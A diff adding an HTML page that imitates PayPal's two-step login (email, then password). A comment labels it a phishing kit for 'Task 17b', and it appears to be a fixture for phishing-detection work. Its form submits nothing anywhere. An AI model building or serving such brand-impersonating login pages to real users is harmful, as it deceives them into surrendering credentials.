@@ -1,0 +1,13 @@
+<!doctype html><meta charset="utf-8"><title>PayPal - Log in</title>
+<!-- Multi-step phishing kit (0.15.0, Task 17b): the password field only appears after "Next". -->
+<h1>PayPal</h1>
+<p>Log in to your PayPal account to continue.</p>
+<form id="f" onsubmit="return false">
+  <input id="email" name="user" placeholder="Email or mobile number">
+  <button id="next" type="button">Next</button>
+  <div id="step2" hidden>
+    <input type="password" name="pw" placeholder="Password">
+    <button type="submit">Log in</button>
+  </div>
+</form>
+<script>document.getElementById('next').addEventListener('click', function () { document.getElementById('step2').hidden = false; });</script>
